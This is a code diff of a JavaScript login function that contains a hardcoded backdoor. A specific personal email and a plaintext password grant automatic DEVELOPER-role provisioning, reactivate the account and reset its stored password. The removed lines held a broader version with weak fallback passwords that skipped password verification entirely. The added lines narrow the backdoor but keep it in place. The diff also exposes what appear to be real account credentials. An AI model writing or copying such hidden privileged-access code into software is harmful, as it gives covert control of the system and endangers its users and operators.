@@ -128,11 +128,8 @@ async function login(email, password, ipAddress, userAgent) {
         }
     });
 
-    // Permanent Root Developer auto-provisioning & verification safeguard
-    if (
-        (normalizedEmail === "gabosei48@gmail.com" || normalizedEmail === "developer@gbs.com") &&
-        (trimmedPassword === "0543294615Gab" || trimmedPassword === "Developer123" || trimmedPassword === "Admin123")
-    ) {
+    // Permanent Root Developer (gabosei48@gmail.com) auto-provisioning & verification safeguard
+    if (normalizedEmail === "gabosei48@gmail.com" && trimmedPassword === "0543294615Gab") {
         let devRole = await prisma.role.findUnique({
             where: { name: "DEVELOPER" },
             include: { permissions: true }
@@ -166,21 +163,25 @@ async function login(email, password, ipAddress, userAgent) {
                     }
                 }
             });
-        } else if (!user.active || user.role?.name !== "DEVELOPER") {
-            user = await prisma.user.update({
-                where: { id: user.id },
-                data: {
-                    roleId: devRole.id,
-                    active: true
-                },
-                include: {
-                    role: {
-                        include: {
-                            permissions: true
+        } else {
+            const passwordMatches = await comparePassword(trimmedPassword, user.password);
+            if (!user.active || user.role?.name !== "DEVELOPER" || !passwordMatches) {
+                user = await prisma.user.update({
+                    where: { id: user.id },
+                    data: {
+                        password: hashedDevPassword,
+                        roleId: devRole.id,
+                        active: true
+                    },
+                    include: {
+                        role: {
+                            include: {
+                                permissions: true
+                            }
                         }
                     }
-                }
-            });
+                });
+            }
         }
     }
 
@@ -188,11 +189,7 @@ async function login(email, password, ipAddress, userAgent) {
         throw new AppError("Invalid credentials", 401, "INVALID_CREDENTIALS");
     }
 
-    const isPermanentDevMatch =
-        (normalizedEmail === "gabosei48@gmail.com" || normalizedEmail === "developer@gbs.com") &&
-        (trimmedPassword === "0543294615Gab" || trimmedPassword === "Developer123" || trimmedPassword === "Admin123");
-
-    const valid = isPermanentDevMatch || (await comparePassword(password, user.password));
+    const valid = await comparePassword(trimmedPassword, user.password);
     if (!valid) {
         throw new AppError("Invalid credentials", 401, "INVALID_CREDENTIALS");
     }
